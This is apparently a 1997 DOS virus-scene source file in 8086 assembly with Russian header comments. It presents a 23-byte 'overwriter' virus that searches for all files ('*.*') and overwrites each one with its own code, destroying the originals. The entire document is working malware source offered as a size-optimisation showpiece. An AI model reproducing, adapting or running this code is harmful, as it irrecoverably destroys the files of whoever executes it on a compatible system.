                ;       [S]1997 SkullC0DEr [TRiAD]
                ;
                ;       Самый маленький оверрайтер (меньше, imho, уже некуда Ж:)
                ;       Размер: 23 байта
                ;       Инфицирование: *.*
                ;       Стабильность: зависит от состояния регистров при запуске
                ;       Требования к CPU: 8086
                ;       Замечания: может не пойти под некоторыми версиями дос

CSEG            SEGMENT
		ORG	100H
		ASSUME	CS:CSEG,DS:CSEG,ES:CSEG,SS:CSEG
START:
                SUB     CH,BYTE PTR DS:[2AH]
                MOV     AH,4EH
ST_1:
                MOV     DX,SI
                INT     21H
                MOV     AH,3CH
                MOV     DX,9EH
                INT     21H
                XCHG    BX,AX
                MOV     AH,40H
                JNC     ST_1
                RETN
CSEG		ENDS
		END	START
